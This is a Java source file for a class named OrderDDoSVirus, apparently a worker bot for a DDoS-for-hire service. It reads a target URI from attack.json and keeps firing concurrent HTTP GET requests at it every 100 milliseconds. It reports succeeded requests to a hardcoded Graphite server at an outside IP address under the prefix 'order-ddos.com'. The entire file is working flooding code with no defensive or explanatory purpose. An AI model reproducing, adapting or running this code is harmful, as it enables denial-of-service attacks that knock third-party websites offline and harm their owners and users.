package com.orderddos.virus;

import com.codahale.metrics.Meter;
import com.codahale.metrics.MetricFilter;
import com.codahale.metrics.MetricRegistry;
import com.codahale.metrics.graphite.Graphite;
import com.codahale.metrics.graphite.GraphiteReporter;
import io.github.avt.env.extend.Launcher;
import io.vertx.core.Vertx;
import io.vertx.core.json.JsonObject;
import io.vertx.ext.web.client.WebClient;
import io.vertx.ext.web.client.WebClientOptions;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetSocketAddress;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

public class OrderDDoSVirus extends Launcher {

    private static final Logger log = LoggerFactory.getLogger(OrderDDoSVirus.class);

    private static final String CARBON_HOST = "104.248.203.116";
    private static final Integer CARBON_PORT = 2005;

    private static final String ATTACK_JSON = "attack.json";
    private static final String ATTACK_DEBUG_JSON = "attack-debug.json";

    public static void main(String[] args) {
        new OrderDDoSVirus().launch(1);
    }


    public static final Long MAX_NUMBER_OF_REQUESTS = 10L;

    @Override
    public void launch(int envPort) {

        Vertx vertx = Vertx.vertx();
        JsonObject json;
        if (vertx.fileSystem().existsBlocking(ATTACK_JSON)) {
            log.info(String.format("Using %s configuration", ATTACK_JSON));
            json = vertx.fileSystem().readFileBlocking(ATTACK_JSON).toJsonObject();
        } else if (vertx.fileSystem().existsBlocking(ATTACK_DEBUG_JSON)) {
            log.info(String.format("Using %s configuration", ATTACK_DEBUG_JSON));
            json = vertx.fileSystem().readFileBlocking(ATTACK_DEBUG_JSON).toJsonObject();
        } else {
            log.error("attack.json and attack-debug.json is missing");
            return;
        }
        UUID uuid = UUID.fromString(json.getString("uuid"));
        String uri = json.getString("uri");

        log.info(String.format("UUID: %s URI: %s", uuid.toString(), uri));

        WebClient webClient = WebClient.create(vertx,
                new WebClientOptions()
                        .setKeepAlive(true)
        );
        MetricRegistry metricRegistry = new MetricRegistry();
        Graphite graphite = new Graphite(new InetSocketAddress(CARBON_HOST, CARBON_PORT));
        final GraphiteReporter reporter = GraphiteReporter.forRegistry(metricRegistry)
                .prefixedWith("order-ddos.com")
                .convertRatesTo(TimeUnit.SECONDS)
                .convertDurationsTo(TimeUnit.MILLISECONDS)
                .filter(MetricFilter.ALL)
                .build(graphite);

        reporter.start(1, TimeUnit.MINUTES);
        Meter meter = metricRegistry.meter(String.format("requests.succeeded.%s", uuid.toString()));

        AtomicLong al = new AtomicLong(0);
        AtomicLong requestsLastSecondsSucceed = new AtomicLong(0);
        AtomicLong requestsLastSecondsFailed = new AtomicLong(0);

        vertx.setPeriodic(100, event -> {
            long dif = MAX_NUMBER_OF_REQUESTS - al.get();
            for (int i = 0; i < dif; i++) {
                al.incrementAndGet();
                webClient.getAbs(uri).send(ctx -> {
                    al.decrementAndGet();
                    if (ctx.succeeded() && ctx.result().statusCode() == 200) {
                        requestsLastSecondsSucceed.incrementAndGet();
                        meter.mark();
                    } else {
                        requestsLastSecondsFailed.incrementAndGet();
                    }
                });
            }
        });

        vertx.setPeriodic(10_000, event -> {
            log.info(String.format("Last 10 seconds requests succeeded/failed: %d/%d",
                    requestsLastSecondsSucceed.get(),
                    requestsLastSecondsFailed.get()));
            requestsLastSecondsSucceed.set(0);
            requestsLastSecondsFailed.set(0);
        });
    }
}
